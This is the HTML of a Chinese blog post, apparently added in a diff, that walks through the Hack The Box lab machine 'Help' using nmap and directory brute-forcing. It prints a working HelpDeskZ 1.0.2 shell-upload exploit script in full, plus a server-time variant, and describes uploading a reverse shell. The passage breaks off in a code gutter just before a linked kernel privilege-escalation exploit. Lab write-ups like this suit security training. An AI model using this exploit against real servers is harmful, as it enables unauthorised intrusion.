@@ -1,0 +1,942 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Hack The Box —— Help - Geekby&#39;s Blog</title><meta name="Description" content="Hack The Box靶场练习记录"><meta property="og:title" content="Hack The Box —— Help" />
+<meta property="og:description" content="Hack The Box靶场练习记录" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2019/09/hacktheboxhelp/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-09-06T11:00:00+08:00" />
+<meta property="article:modified_time" content="2019-09-06T11:00:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hack The Box —— Help"/>
+<meta name="twitter:description" content="Hack The Box靶场练习记录"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2019/09/hacktheboxhelp/" /><link rel="prev" href="https://www.geekby.site/2019/09/hacktheboxtenten/" /><link rel="next" href="https://www.geekby.site/2019/09/hacktheboxblocky/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Hack The Box —— Help",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2019\/09\/hacktheboxhelp\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "HTB靶场","wordcount":  1108 ,
+        "url": "https:\/\/www.geekby.site\/2019\/09\/hacktheboxhelp\/","datePublished": "2019-09-06T11:00:00+08:00","dateModified": "2019-09-06T11:00:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "Hack The Box靶场练习记录"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Hack The Box —— Help</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/"><i class="far fa-folder fa-fw"></i>靶场</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2019-09-06">2019-09-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1108 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#信息搜集">信息搜集</a>
+      <ul>
+        <li><a href="#nmap">nmap</a></li>
+      </ul>
+    </li>
+    <li><a href="#目录爆破">目录爆破</a></li>
+    <li><a href="#漏洞利用">漏洞利用</a></li>
+    <li><a href="#提权">提权</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="hack-the-box--help">Hack The Box —— Help</h1>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183320.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183320.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183320.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183320.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183320.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183320.png-water_print" /></p>
+<h2 id="信息搜集">信息搜集</h2>
+<h3 id="nmap">nmap</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">nmap -T4 -A -v 10.10.10.121
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183229.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183229.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183229.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183229.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183229.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183229.png-water_print" /></p>
+<p>发现 22、80、3000 端口开放，访问 80 端口，是一个 apache 默认页面。</p>
+<h2 id="目录爆破">目录爆破</h2>
+<p>利用 <code>dirbuster</code> 爆破目录：
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183610.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183610.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183610.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183610.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183610.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183610.png-water_print" /></p>
+<p>发现 <code>support</code> 目录，访问得到：
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183647.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183647.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183647.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183647.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183647.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906183647.png-water_print" /></p>
+<p>搜索 helpdeskz 相关漏洞，发现一处任意文件上传漏洞：<a href="https://www.exploit-db.com/exploits/40300" target="_blank" rel="noopener noreffer">https://www.exploit-db.com/exploits/40300</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="nb">print</span> <span class="s1">&#39;Helpdeskz v1.0.2 - Unauthenticated shell upload exploit&#39;</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+    <span class="nb">print</span> <span class="s2">&#34;Usage: </span><span class="si">{}</span><span class="s2"> [baseUrl] [nameOfUploadedFile]&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">helpdeskzBaseUrl</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">fileName</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+
+<span class="n">currentTime</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
+
+<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">300</span><span class="p">):</span>
+    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">fileName</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">currentTime</span> <span class="o">-</span> <span class="n">x</span><span class="p">)</span>
+    <span class="n">md5hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+
+    <span class="n">url</span> <span class="o">=</span> <span class="n">helpdeskzBaseUrl</span><span class="o">+</span><span class="n">md5hash</span><span class="o">+</span><span class="s1">&#39;.php&#39;</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">head</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="s2">&#34;found!&#34;</span>
+        <span class="nb">print</span> <span class="n">url</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="nb">print</span> <span class="s2">&#34;Sorry, I did not find anything&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="漏洞利用">漏洞利用</h2>
+<p>首先，在 submit a ticket 处上传一个反弹 shell 的脚本文件：
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906184143.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906184143.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906184143.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906184143.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906184143.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906184143.png-water_print" /></p>
+<p>返回：
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906184233.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906184233.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906184233.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906184233.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906184233.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906184233.png-water_print" /></p>
+<p>然后，执行 exp 脚本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python2 poc.py http://10.10.10.121/support/uploads/tickets/ 1.php
+</code></pre></td></tr></table>
+</div>
+</div><p>但是此处无论如何都不能访问到 shell，后来经过查询相关资料得知：由于服务器所在地区的时区与国内的时区不一样导致 <code>current - x</code> 得到的数不正确，因此，将脚本稍作改动：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">calendar</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+ 
+<span class="nb">print</span> <span class="s1">&#39;Helpdeskz v1.0.2 - Unauthenticated shell upload exploit&#39;</span>
+ 
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+    <span class="nb">print</span> <span class="s2">&#34;Usage: </span><span class="si">{}</span><span class="s2"> [baseUrl] [nameOfUploadedFile]&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+ 
+<span class="n">helpdeskzBaseUrl</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">fileName</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+ 
+<span class="c1"># currentTime = int(time.time())</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">head</span><span class="p">(</span><span class="n">helpdeskzBaseUrl</span><span class="p">)</span>
+<span class="n">serverTime</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s2">&#34;Date&#34;</span><span class="p">]</span>
+<span class="nb">print</span> <span class="n">serverTime</span>
+<span class="n">timeFormat</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">%a</span><span class="s2">, </span><span class="si">%d</span><span class="s2"> %b %Y %H:%M:%S %Z&#34;</span>
+<span class="n">currentTime</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">calendar</span><span class="o">.</span><span class="n">timegm</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">strptime</span><span class="p">(</span><span class="n">serverTime</span><span class="p">,</span> <span class="n">timeFormat</span><span class="p">)))</span>
+<span class="nb">print</span> <span class="n">currentTime</span>
+ 
+<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">90</span><span class="p">):</span>
+    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">fileName</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">currentTime</span> <span class="o">-</span> <span class="n">x</span><span class="p">)</span>
+    <span class="n">md5hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+ 
+    <span class="n">url</span> <span class="o">=</span> <span class="n">helpdeskzBaseUrl</span><span class="o">+</span><span class="n">md5hash</span><span class="o">+</span><span class="s1">&#39;.php&#39;</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">head</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="s2">&#34;found!&#34;</span>
+        <span class="nb">print</span> <span class="n">url</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+ 
+<span class="nb">print</span> <span class="s2">&#34;Sorry, I did not find anything&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>成功反弹 shell：
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185003.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185003.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185003.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185003.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185003.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185003.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185009.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185009.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185009.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185009.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185009.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185009.png-water_print" /></p>
+<p>查看 <code>user.txt</code> 获取第一个 flag</p>
+<p><code>whoami</code> 查看权限，发现时普通用户权限</p>
+<p><code>uname -a</code>查看内核版本号，尝试内核提权。
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185333.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185333.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185333.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185333.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185333.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190906185333.png-water_print" /></p>
+<h2 id="提权">提权</h2>
+<p>搜索相关内核版本漏洞信息，发现<a href="https://www.exploit-db.com/exploits/44298" target="_blank" rel="noopener noreffer">https://www.exploit-db.com/exploits/44298</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
